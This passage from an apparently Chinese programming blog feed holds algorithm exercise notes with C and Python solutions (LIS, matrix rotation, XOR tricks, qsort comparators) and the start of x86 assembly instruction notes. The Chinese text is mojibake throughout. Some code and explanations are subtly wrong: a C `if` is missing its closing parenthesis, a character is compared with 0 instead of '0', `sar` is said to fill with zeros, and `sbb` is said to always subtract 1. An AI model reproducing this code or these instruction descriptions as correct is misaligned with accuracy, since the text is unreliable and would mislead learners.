class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLIS</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(numsSize == <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">max</span> = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> dp[numsSize];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++)</span><br><span class="line">  &#123;</span><br><span class="line">      dp[i] = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) </span><br><span class="line">          <span class="keyword">if</span>(nums[i] &gt; nums[j])</span><br><span class="line">              dp[i] = dp[i] &gt; dp[j]+<span class="number">1</span> ? dp[i]:dp[j]+<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span>(dp[i] &gt; <span class="built_in">max</span></span><br><span class="line">         <span class="built_in">max</span> = dp[i];</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">max</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ—‹è½¬çŸ©é˜µ"><a href="#æ—‹è½¬çŸ©é˜µ" class="headerlink" title="æ—‹è½¬çŸ©é˜µ"></a>æ—‹è½¬çŸ©é˜µ</h2><p>å¯¹äºçŸ©é˜µä¸­æ¯ä¸€è¡Œéƒ½æ—‹è½¬90Â°ï¼Œ åœ¨ä¸å ç”¨é¢å¤–ç©ºé—´æƒ…å†µä¸‹ã€‚å¯ä»¥å…ˆæŠŠæ•´ä¸ªçŸ©é˜µè½¬ç½®ä¸€ä¸‹ï¼Œå†å·¦å³çš„2çš„æ•°äº¤æ¢ä¸€ä¸‹ä½ç½®å³å®ç°ã€‚</p><p><img src="/2020/03/14/leetcode/image-20200425195006467-1590548409622.png" alt="image-20200425195006467"></p><p>é¢˜è§£:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>** matrix, <span class="keyword">int</span> matrixSize, <span class="keyword">int</span>* matrixColSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; matrixSize; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt; *matrixColSize; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = matrix[i][j];</span><br><span class="line">matrix[i][j] = matrix[j][i];</span><br><span class="line">matrix[j][i] = temp;</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> mid = matrixSize &gt;&gt; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; matrixSize; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; mid; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = matrix[i][j];</span><br><span class="line">matrix[i][j] = matrix[i][matrixSize-j<span class="number">-1</span>];</span><br><span class="line">matrix[i][matrixSize-j<span class="number">-1</span>] = temp;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="åˆ†å‰²å­—ç¬¦ä¸²"><a href="#åˆ†å‰²å­—ç¬¦ä¸²" class="headerlink" title="åˆ†å‰²å­—ç¬¦ä¸²"></a>åˆ†å‰²å­—ç¬¦ä¸²</h2><p><strong>ä¸€é“é¢˜ä¸éš¾çš„é¢˜ï¼Œä½†æ˜¯è§‰å¾—æ€æƒ³åº”è¯¥è®°ä¸€ä¸‹ã€‚</strong></p><p><img src="/2020/03/14/leetcode/image-20200426184623169-1590548415836.png" alt="image-20200426184623169"></p><p>ç¬¬ä¸€ä¸ªæ€è·¯æ˜¯: åªç®¡å·¦è¾¹, ç»Ÿè®¡å·¦è¾¹0å’Œ1å‡ºç°çš„æ¬¡æ•°, åªè¦ä»å·¦åˆ°å³å¾ªç¯ï¼Œ0å‡ºç°çš„æ¬¡æ•°ä¸1å‡ºç°çš„æ¬¡æ•°ä¹‹å·®æ¯”ç¬¬ä¸€ä¸ªæ¯”å¼€å§‹å¤§ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ç¡®å®šåˆ†å‰²çš„ä½ç½®å°±å¯ä»¥å¾€åç§»ã€‚å¾ªç¯ä¸€éï¼Œæ‰¾åˆ°äº†ä½ç½®ï¼Œå†åˆ†åˆ«ç›¸åŠ ã€‚</p><p><strong>ç¬¬äºŒä¸ªæ€è·¯:</strong> å…ˆæŠŠæ‰€æœ‰çš„ 1 éƒ½ç»Ÿè®¡å‡ºæ¥ï¼Œå†å·¦å¾€å³å¾ªç¯ï¼Œ åªè¦æ˜¯å­—ç¬¦0å°±åŠ 1ï¼Œ å­—ç¬¦1å°±å‡1ã€‚ç¬¬äºŒä¸ªæ€è·¯ä»£ç : Cè¯­è¨€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxScore</span><span class="params">(<span class="keyword">char</span> * s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)</span><br><span class="line">count += (s[i] == <span class="number">49</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)</span><br><span class="line">&#123;</span><br><span class="line">count += (s[i] == <span class="number">0</span> ? <span class="number">1</span> : <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">ans = (ans &gt; count ? ans : count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxScore</span><span class="params">(self, s: str)</span> -&gt; int:</span></span><br><span class="line">        count = s.count(<span class="string">'1'</span>)</span><br><span class="line">        ans = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s[:<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">'0'</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                count -= <span class="number">1</span></span><br><span class="line">            ans = max(ans, count)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><p>æœ€å, åŒç„¶çš„ç®—æ³•, pythonè™½ç„¶æ–¹ä¾¿,ä½†æ˜¯pythonåœ¨æ—¶é—´å’Œç©ºé—´å¤æ‚åº¦ä¸Š, æ¯”Cè¯­è¨€å¤§å¥½å¤š.</p><h2 id="å¼‚æˆ–è¿ç®—"><a href="#å¼‚æˆ–è¿ç®—" class="headerlink" title="å¼‚æˆ–è¿ç®—"></a>å¼‚æˆ–è¿ç®—</h2><blockquote><p><strong>å¼‚æˆ–è¿ç®—çš„è¿ç”¨, å¯¹é€†å‘åˆ†ææœ‰å¸®åŠ©.</strong></p></blockquote><p>é¦–å…ˆå¼‚æˆ–è¿ç®—çš„æ€§è´¨æœ‰.</p><table><thead><tr><th>äº¤æ¢å¾‹</th><th>a ^ b  = b ^ a</th></tr></thead><tbody><tr><td><strong>ç»“åˆå¾‹</strong></td><td><strong>(a ^ b) ^ c = a ^ (b ^ c)</strong></td></tr><tr><td><strong>å¯¹äºä»»ä½•æ•°a</strong></td><td><strong>x ^ x = 0,  x ^ 0 = x</strong></td></tr><tr><td><strong>è‡ªåæ€§</strong></td><td><strong>a ^ b = c  -&gt;  c ^ b = a</strong></td></tr></tbody></table><p>ç¬¬ä¸€ç§é¢˜å‹: (è¦æ±‚æ˜¯ ç©ºé—´å¤æ‚åº¦ 0(1)ï¼Œ æ—¶é—´å¤æ‚åº¦ 0(n))</p><p>åœ¨ä¸€ä¸ªæ•°ç»„ <code>nums</code> ä¸­é™¤ä¸€ä¸ªæ•°å­—åªå‡ºç°ä¸€æ¬¡ä¹‹å¤–ï¼Œå…¶ä»–æ•°å­—éƒ½å‡ºç°äº†2æ¬¡ã€‚ è¯·æ‰¾å‡ºé‚£ä¸ªåªå‡ºç°ä¸€æ¬¡çš„æ•°å­—ã€‚</p><p><strong>æ€è·¯ä¸€: ç”¨æ•°å­¦çš„æ–¹æ³•ï¼Œé¦–å…ˆè®©è®©æ•°ç»„ä¸­éé‡å¤çš„æ•°å­—éƒ½ç›¸åŠ åç­‰2<code>(sum(set(nums)))*2</code>ï¼Œç„¶åè®©sè¯¥æ•°ç»„æ±‚å’Œ<code>(sum(nums))</code>ï¼Œ2è€…åªå·®å¾—åˆ°ç­”æ¡ˆã€‚</strong></p><p><strong>æ€è·¯äºŒï¼šç”±å¼‚æˆ–è¿ç®—çš„æ€§è´¨ï¼Œæˆ‘ä»¬è®©æ‰€æœ‰çš„å…ƒç´ å¼‚æˆ–è¿ç®—ï¼Œç»“æœå°±æ˜¯ç­”æ¡ˆ</strong></p><p>ç¬¬äºŒç§é¢˜å‹ï¼Œæ˜¯ç¬¬ä¸€ç§çš„å»¶ä¼¸ã€‚</p><p><img src="/2020/03/14/leetcode/image-20200428123916375-1590548423589.png" alt="image-20200428123916375"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">singleNumbers</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>, flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> *ans = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(ans, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++)</span><br><span class="line">sum ^= nums[i];    /æœ‰ç¬¬ä¸€ä¸ªé¢˜å‹, æˆ‘ä»¬çŸ¥é“æœ€åç»“æœæ˜¯ä¸ç›¸åŒä¸¤ä¸ªæ•°çš„å¼‚æˆ–ç»“æœ.</span><br><span class="line"></span><br><span class="line">flag = (-sum)&amp;sum;  /å–sumçš„æ‰€æœ‰ä½ä¸­ç¬¬ä¸€ä¸ªä¸º<span class="number">1</span>çš„ä½.</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numsSize; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(flag &amp; nums[i])   /å°†ä¸ç›¸åŒçš„ä¸¤ä¸ªæ•°è¿›è¡Œåˆ†ç»„, ä¾æ®ä¸Šé¢è®¡ç®—çš„flag.</span><br><span class="line">ans[<span class="number">0</span>] ^= nums[i];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ans[<span class="number">1</span>] ^= nums[i]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">    *returnSize = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="qsortçš„ä½¿ç”¨"><a href="#qsortçš„ä½¿ç”¨" class="headerlink" title="qsortçš„ä½¿ç”¨"></a>qsortçš„ä½¿ç”¨</h2><p><strong>å¯ä»¥è‡ªå®šä¹‰æ’åºï¼Œæ¯”è‡ªå·±çš„å†™çš„å¿«æ’å¿«å¤šäº†ã€‚int cmp(const void *a, const void *b);</strong></p><p><img src="/2020/03/14/leetcode/image-20200608091627383.png" alt="image-20200608091627383"></p><p>è¿™é“é¢˜è‡ªå·±å†™çš„å¿«æ’è¿‡ä¸äº†ï¼Œåé¢æ¢ç”¨Cåº“çš„qsortè‡ªå®šä¹‰æ’åºå°±å¥½äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (*(<span class="keyword">int</span> *)a-*(<span class="keyword">int</span> *)b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp2</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *p = (<span class="keyword">int</span> *)a;</span><br><span class="line"><span class="keyword">int</span> *q = (<span class="keyword">int</span> *)b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">abs</span>(*p-m) == <span class="built_in">abs</span>(*q-m))</span><br><span class="line"><span class="keyword">return</span> *p-*q;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">abs</span>(*p-m)-<span class="built_in">abs</span>(*q-m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">getStrongest</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> arrSize, <span class="keyword">int</span> k, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> qsort(arr, arrSize, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp1);</span><br><span class="line"> m = arr[(arrSize<span class="number">-1</span>)/<span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line"> qsort(arr, arrSize, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp2);</span><br><span class="line"> </span><br><span class="line"> *returnSize = k;</span><br><span class="line"> <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼šæ ¹æ®é¢˜ç›®è¦æ±‚è‡ªå®šä¹‰æ’åºæ–¹æ³•ï¼Œè¿˜æ˜¯å¾ˆçµæ´»ã€‚</strong></p>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®ç»“æ„ä¸ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ±‡ç¼–å­¦ä¹ </title>
      <link href="/2020/03/06/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/03/06/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¼–è¯‘é—®é¢˜"><a href="#ç¼–è¯‘é—®é¢˜" class="headerlink" title="ç¼–è¯‘é—®é¢˜"></a>ç¼–è¯‘é—®é¢˜</h2><p>ç”±äºç°åœ¨çš„è®¡ç®—æœºæ˜¯64ä½ï¼Œè€Œdebugæ˜¯å½“å¹´åœ¨16ä½çš„è®¡ç®—æœºä¸Šæçš„ï¼Œåœ¨32ä½è®¡ç®—æœºä¸­ï¼Œå¾®è½¯è¿˜åœ¨ç³»ç»ŸåŒå¢åŠ äº†debugè¿™ä¸ªå·¥å…·ï¼Œä½†æ˜¯åˆ°äº†64ä½ï¼Œå´æ²¡æœ‰åŠ ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è‡ªå·±å»ä¸‹è½½ä¸€ä¸ª dosbox å¼€æºçš„dosæ¨¡æ‹Ÿå™¨ï¼Œç„¶åå°†debugåœ¨dosboxä¸­è¿è¡Œã€‚å½“ç„¶è¿™äº›éƒ½æ˜¯æ²¡é—®é¢˜çš„ã€‚é—®é¢˜æ˜¯: <a id="more"></a></p><p>åœ¨ä¸‹è½½masmåï¼Œç”±äºç¬¬ä¸€æ¬¡æ¥è§¦ï¼Œç¼–å†™å¥½æºç¨‹åºåï¼Œç”¨æŒ‡ä»¤ masm   xxxã€‚asm ã€‚ä½†æ˜¯ä¸€ç›´æŠ¥ A2044çš„é”™è¯¯ï¼Œå°±ç™¾åº¦ï¼ŒçŸ¥ä¹ï¼Œéƒ½è¯´è¾“å…¥çš„æ ¼å¼é”™è¯¯ï¼Œæˆ–è€…æœ‰éæ³•å­—ç¬¦ã€‚ä½†æ˜¯ç¡®å®šäº†æ²¡æœ‰ä¹‹åè¿˜æ˜¯æŠ¥é”™ï¼Œå°±è¿™æ ·ç—›è‹¦äº†ä¸€æ™šä¸Šï¼Œç¬¬äºŒå¤©èµ·æ¥ï¼Œè¿˜æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œå°±æŠ±ç€è¯•ä¸€è¯•(å¥”æºƒäº†),æ¢äº†ä¸ªmasmç‰ˆæœ¬ï¼Œè¿™æ¬¡æˆåŠŸäº†ã€‚ ä½†æ˜¯åœ¨ç¼–å†™ä¸€ä¸ªæ–°çš„æºç¨‹åºï¼Œåˆæ˜¯è¿™ä¸ªé”™è¯¯ï¼Œå†æ¬¡å´©ï¼Œ()/(ã„’oã„’)/~~ã€‚</p><p>çªç„¶æˆ‘æƒ³åˆ°ï¼Œä¼šä¸ä¼šæ˜¯ç¼–ç æ ¼å¼çš„é”™è¯¯å‘¢ï¼Œå°±æ¢äº†UTF-8è¯•ä¸€ä¸‹ï¼Œæœç„¶ã€‚ã€‚ã€‚</p><p>æ—¢ç„¶ç½‘ä¸Šéƒ½è¯´äº†æ ¼å¼æˆ–è€…éæ³•å­—ç¬¦ï¼Œé‚£æ€ä¹ˆæ²¡æƒ³åˆ°ç¼–ç é—®é¢˜å‘¢ã€‚</p><h2 id="ä¸€äº›æŒ‡ä»¤è®°å½•"><a href="#ä¸€äº›æŒ‡ä»¤è®°å½•" class="headerlink" title="ä¸€äº›æŒ‡ä»¤è®°å½•"></a>ä¸€äº›æŒ‡ä»¤è®°å½•</h2><ul><li><p>andæŒ‡ä»¤ï¼šORæ˜¯æŒ‰ä½â€œæˆ–â€æ“ä½œã€‚ä½†æ˜¯å¯ä»¥ç”¨æ¥è¡¨ç¤ºincæ“ä½œï¼Œæ¯”å¦‚ <code>0 and 3 = 0ï¼Œ1 and 3 = 1ï¼Œ2 and 3 = 2ï¼Œ3 and 3 = 3ï¼Œ4 and 3 = 0ï¼Œ5 and 3 = 1</code>ï¼Œä»¥æ­¤åš 0-3 çš„å¾ªç¯ã€‚</p></li><li><p>salæŒ‡ä»¤ï¼šå°†æ•°æ®å‘å·¦ç§»ä½ï¼Œç§»äº†çš„ä½ç”¨0å¡«å……ã€‚ç§»åŠ¨ä¸€ä½ç›¸å½“äºä¹˜2ã€‚</p></li><li><p>saræŒ‡ä»¤ï¼šå°†æ•°æ®å‘å³ç§»ä½ï¼Œç§»äº†çš„ä½ç”¨0å¡«å……ã€‚ç§»åŠ¨ä¸€ä½ç›¸å½“äºé™¤2ï¼Œä¸ç”¨è€ƒè™‘ä½™æ•°ã€‚ æ¯”å¦‚ eax = 3 (11) ï¼Œ sar eaxï¼Œ1 å eax = (01) = 1ï¼Œç›¸å½“äº 3/2 = 1ã€‚</p></li><li><p>roræŒ‡ä»¤ï¼š<strong>å¾ªç¯å³ç§»</strong>ï¼ŒæŠŠæ‰€æœ‰ä½éƒ½å‘å³ç§»ï¼Œæœ€ä½ä½å¤åˆ¶åˆ°è¿›ä½æ ‡å¿—ä½å’Œæœ€é«˜ä½ã€‚æŒ‡ä»¤ç”¨Cè¯­è¨€æ¥å®ç°ï¼šå¦‚ <code>ror aï¼Œ3</code> å¯¹åº” <code>((a&gt;&gt;3ï¼‰| ((a&amp;7) &lt;&lt; 5))</code>ã€‚</p><p><img src="/2020/03/06/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/image-20200529164348298.png" alt="image-20200529164348298"></p></li><li><p>rolæŒ‡ä»¤ï¼š<strong>å¾ªç¯å·¦ç§»</strong>ï¼Œä¸rorç±»ä¼¼ã€‚</p></li><li><p>negï¼šNEGå‘½ä»¤æ— è®ºä½ æ˜¯å¦ä¸ºæ­£è´Ÿæ•°ï¼Œéƒ½ä¼šæŒ‰ç…§å–å+1æˆ–ç”¨0å‡å»è¿™ä¸ªbaiæ•°çš„äºŒè¿›åˆ¶çš„åŠæ³•å»è®¡ç®—ã€‚å½“æ“ä½œæ•°ä¸º0æ—¶ï¼Œç½®CFä½ä¸º0ï¼›å½“æ“ä½œæ•°ä¸ä¸º0æ—¶ï¼Œç½®CFä½ä¸º1ã€‚<strong>intelæ‰‹å†Œï¼šThe CF flag set to 0 if the source operand is 0; otherwise it is set to 1ã€‚ The OFï¼ŒSFï¼ŒZFï¼ŒAFï¼Œand PF flags are set according to the resultã€‚</strong> </p></li><li><p>sbbï¼šå¸¦å€Ÿä½å‡æ³•æŒ‡ä»¤ï¼Œå®ƒåˆ©ç”¨äº†CFä½ä¸Šè®°å½•çš„å€Ÿä½å€¼ã€‚æŒ‡ä»¤æ ¼å¼ï¼šsbb æ“ä½œå¯¹è±¡1ï¼Œæ“ä½œå¯¹è±¡2ï¼›åŠŸèƒ½ï¼šæ“ä½œå¯¹è±¡1 = æ“ä½œå¯¹è±¡1 - æ“ä½œå¯¹è±¡2 - 1ï¼›</p></li><li><table><thead><tr><th>æŒ‡ä»¤</th><th>åŒä¹‰å</th><th>æ•ˆæœ</th><th>è®¾ç½®æ¡ä»¶</th></tr></thead><tbody><tr><td>sete D</td><td>setz</td><td>D = ZF</td><td>ç›¸ç­‰/é›¶</td></tr><tr><td>setne D</td><td>setnz</td><td>D = ~ZF</td><td>ä¸ç­‰/éé›¶</td></tr></tbody></table></li><li><p>cdqï¼šè¿™ä¸ªæŒ‡ä»¤æŠŠ EAX çš„ç¬¬ 31 bit å¤åˆ¶åˆ° EDX çš„æ¯ä¸€ä¸ª bit ä¸Šã€‚ å®ƒå¤§å¤šå‡ºç°åœ¨é™¤æ³•è¿ç®—ä¹‹å‰ã€‚å®ƒå®é™…çš„ä½œç”¨åªæ˜¯æŠŠEDXçš„æ‰€æœ‰ä½éƒ½è®¾æˆEAXæœ€é«˜ä½çš„å€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“EAX &lt;80000000ï¼ŒEDX ä¸º00000000ï¼›å½“EAX &gt;= 80000000ï¼Œ EDX åˆ™ä¸ºFFFFFFFFã€‚</p><p>ä¾‹å¦‚ :</p><pre><code> å‡è®¾ EAX æ˜¯ FFFFFFFB (-5) ï¼Œå®ƒçš„ç¬¬ 31 bit (æœ€å·¦è¾¹) æ˜¯ 1ï¼Œ æ‰§è¡Œ CDQ åï¼Œ CDQ æŠŠç¬¬ 31 bit å¤åˆ¶è‡³ EDX æ‰€æœ‰ bit EDX å˜æˆ FFFFFFFFè¿™æ—¶å€™ï¼Œ EDX:EAX å˜æˆ FFFFFFFF FFFFFFFB ï¼Œå®ƒæ˜¯ä¸€ä¸ª 64 bit çš„å¤§å‹æ•°å­—ï¼Œæ•°å€¼ä¾æ—§æ˜¯ -5ã€‚</code></pre><p>å¤‡æ³¨ï¼š</p><p>â€‹    EDX:EAX,è¿™é‡Œè¡¨ç¤ºEDXï¼ŒEAXè¿ç”¨è¡¨ç¤º64ä½æ•°</p></li><li><p>xchgï¼šå¯„å­˜å™¨å’Œ<a href="https://baikeã€‚baiduã€‚com/item/å†…å­˜å˜é‡/3389507" target="_blank" rel="noopener">å†…å­˜å˜é‡</a>ä¹‹é—´å†…å®¹çš„äº¤æ¢æŒ‡ä»¤ï¼Œä¸¤ä¸ª<a href="https://baikeã€‚baiduã€‚com/item/æ“ä½œæ•°/7658270" target="_blank" rel="noopener">æ“ä½œæ•°</a>çš„æ•°æ®ç±»å‹è¦ç›¸åŒï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå­—ï¼Œä¹Ÿå¯ä»¥æ˜¯åŒå­—ã€‚</p></li><li><p>shr ä¸shlï¼šshlå’Œshræ˜¯é€»è¾‘ç§»ä½æŒ‡ä»¤ï¼Œshlæ˜¯é€»è¾‘å·¦ç§»æŒ‡ä»¤ï¼Œå®ƒçš„åŠŸèƒ½ä¸ºï¼šï¼ˆ1ï¼‰å°†ä¸€ä¸ªå¯„å­˜å™¨æˆ–å†…å­˜å•å…ƒä¸­çš„æ•°æ®å‘å·¦ç§»ä½ï¼›ï¼ˆ2ï¼‰å°†<strong>æœ€åç§»å‡ºçš„ä¸€ä½</strong>å†™å…¥CFä¸­ï¼›ï¼ˆ3ï¼‰æœ€ä½ä½ç”¨0è¡¥å……ã€‚shræ˜¯é€»è¾‘å³ç§»æŒ‡ä»¤ï¼Œå®ƒå’Œshlæ‰€è¿›è¡Œçš„æ“ä½œåˆšå¥½ç›¸åã€‚</p></li><li><p>dasï¼šç»„åˆ(å‹ç¼©)BCDç çš„åŠ æ³•è°ƒæ•´æŒ‡ä»¤ã€‚ä½¿ç”¨DASæŒ‡ä»¤æ—¶ï¼Œé€šå¸¸å…ˆæ‰§è¡ŒSUB/SBBæŒ‡ä»¤ï¼Œå°†ä¸¤ä¸ªå‹ç¼©BCDç ç›¸å‡ï¼Œç»“æœå­˜æ”¾åœ¨ALä¸­ã€‚åŠŸèƒ½ï¼šå¦‚æœALä½å››ä½&gt;9æˆ–AF=1 ï¼Œåˆ™ALçš„å€¼å‡06hï¼Œå¹¶ç½®AF=1ï¼›å¦‚æœALé«˜å››ä½&gt;9æˆ–CF=1 ï¼Œåˆ™ALçš„å€¼å‡60h ,ä¸”ç½®CF=1ï¼›</p></li><li><p>cdqï¼šcdqçš„ä½œç”¨æ— éå°±æ˜¯å°†ä¸€ä¸ª32ä½æœ‰ç¬¦åˆæ•°æ‰©å±•ä¸º64ä½æœ‰ç¬¦åˆæ•°ï¼Œæ•°æ®èƒ½è¡¨ç¤ºçš„æ•°ä¸å˜ï¼Œå…·ä½“æ˜¯è¿™æ 